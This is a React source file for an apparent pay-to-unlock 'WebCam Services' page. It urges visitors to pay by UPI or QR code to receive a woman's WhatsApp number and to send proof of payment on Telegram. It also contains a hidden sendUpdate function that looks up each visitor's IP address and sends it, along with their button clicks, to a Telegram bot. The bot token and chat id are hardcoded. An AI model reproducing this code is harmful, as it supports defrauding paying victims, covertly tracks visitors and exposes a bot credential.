/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable no-unused-vars */
import './App.css';
import React, { useEffect, useState } from 'react';
import WhatsappModal from './WhatsappModal';
import PaymentModal from './PaymentModal';
import CopyModal from './CopyModal';
import ProfileCard from './ProfileCard';
import QRCard from './QRCard';
import profiles from './profiles';

let ip = 'Not Found'

export async function sendUpdate(msg) {
  if (ip === 'Not Found') {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  } else {
    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
    fetch(url, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: ''
    }).then(res => {
      console.log("Request complete!");
    })
  }
}

function App() {
  const [isPaymentOpen, setIsPaymentOpen] = useState(false);
  const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
  const [isQROpen, setIsQROpen] = useState(false);
  const telegramLink = process.env.REACT_APP_USERNAME?.toLowerCase() || 'shruthiee'


  const handlepayButton = async () => {
    console.log('pay button clicked')
    setIsPaymentOpen(!isPaymentOpen);
    await sendUpdate("PayButton")
  }

  const handleQRButton = async () => {
    console.log('QR button clicked')
    setIsQROpen(!isQROpen);
    await sendUpdate("QRButton")
  }

  const togglePay = () => {
    setIsPaymentOpen(!isPaymentOpen);
  }

  const handleWspButton = async () => {
    setIsWhatsappOpen(!isWhatsappOpen)
    await sendUpdate("WhatsppBtn")
    //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl&am=1000", "_self");
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <header className="App-header">
        <h1 style={{ color: "#82ffa5", marginBottom: '5px' }}><img style={{ width: "200px" }} alt='' src='./logo.svg'></img></h1>
        <h6 id='serviceName'>WebCam Services</h6>
        <ProfileCard />
        <div className="msgBtn">
          <h6>{"Finish PAYMENT to Unlock the Number!!😜"}</h6>
          <button className='button' onClick={() => { handlepayButton() }}>{"PAY NOW!!"}</button>{' '}
          <button className='button' onClick={() => { handleQRButton() }}>{"QR Code"}</button>
        </div>
        <div className="msgBtn">
          <h6>{"Click Below👇 For My Whatsapp Number!!"}</h6>
          <button className='button' onClick={() => { handleWspButton() }}>{"Whatsapp Number!"}</button>
        </div>
        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY and Send me SCREENSHOT on Telegram!!🥰</h6>
        <button class="telegram-button">
          <img src="./tg.svg" style={{ width: '20px', margin: '-2% 3% 0 -3%' }} alt="Telegram logo"></img>
          <a href={`https://t.me/${telegramLink}`}> Telegram </a>
        </button>
        <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
        <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} className="special_modal2"></PaymentModal>
        <QRCard isOpen={isQROpen} setisOpen={setIsQROpen} className="special_modal2"></QRCard>
      </header>
    </div >
  );
}


export default App;
